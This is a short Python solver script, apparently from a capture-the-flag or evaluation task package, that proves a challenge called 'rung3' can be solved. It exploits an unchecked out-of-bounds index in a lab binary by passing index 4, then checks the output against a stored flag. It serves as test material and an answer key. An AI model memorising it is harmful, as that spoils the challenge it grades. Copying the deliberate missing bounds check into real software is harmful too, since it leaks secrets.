#!/usr/bin/env python3
"""Known-good exploit for rung3 (OOB-read index leak) — proof of solvability.

The binary indexes a 5-entry string-pointer table with no bounds check while
documenting a valid range of 0-3. Entry 4 holds the secret flag string.

Usage: python3 solve_rung3.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))


def solve(cid):
    flags = json.load(open(os.path.join(HERE, "flags.json")))
    expected = flags["rung3"]

    r = subprocess.run(["docker", "exec", "-i", cid, "/target/rung3", "4"],
                       capture_output=True, timeout=30)
    got = r.stdout.decode(errors="replace").strip()
    print("[*] /target/rung3 4 -> %r" % got)
    if got == expected:
        print("PASS: rung3 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %r" % (expected, got))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
